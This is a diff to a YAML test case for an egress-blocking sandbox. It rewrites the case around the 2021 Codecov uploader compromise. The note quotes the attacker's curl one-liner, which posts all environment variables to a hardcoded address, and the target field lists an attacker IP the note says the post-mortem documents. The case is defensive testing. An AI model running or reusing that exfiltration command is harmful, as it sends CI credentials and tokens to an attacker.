@@ -1,14 +1,30 @@
 id: egress-raw-ip
-title: Payload skips DNS and connects to a literal address
+title: Payload skips DNS and posts harvested environment variables to a literal address
 chain_link: 5
 ecosystem: npm
-source: constructed
+source: https://about.codecov.io/apr-2021-post-mortem/
 expect: denied
 requires: policy
+
 target:
-  host: 203.0.113.10
+  host: 178.62.86.114
   port: 443
+
 note: >
-  Hostname policy is meaningless if an address bypasses it. Raw addresses are
-  rejected in every encoding, so an allowlist cannot be sidestepped by not using
-  a name at all.
+  The Codecov Bash Uploader, altered between 31 January and 1 April 2021 and
+  undetected for two months. One line was added to a script that CI pipelines
+  piped into a shell:
+
+    curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" https://<ip>/upload/v2
+
+  That is the entire attack. It harvested every environment variable in the CI
+  environment - where the API keys, tokens and cloud credentials live - and
+  posted them to a hardcoded address. HashiCorp, Twilio, Rapid7 and Confluent
+  all confirmed exposure.
+  The address above is one of the two documented in the post-mortem. It is
+  never contacted: the proxy refuses on the policy decision before any
+  connection or name resolution happens.
+  Blastgate breaks this twice over. The environment filter means $(env) inside
+  the sandbox returns nothing worth stealing, and a literal address is refused
+  in every encoding, so skipping DNS buys nothing. Either alone would be
+  enough; the attack needed both to work.
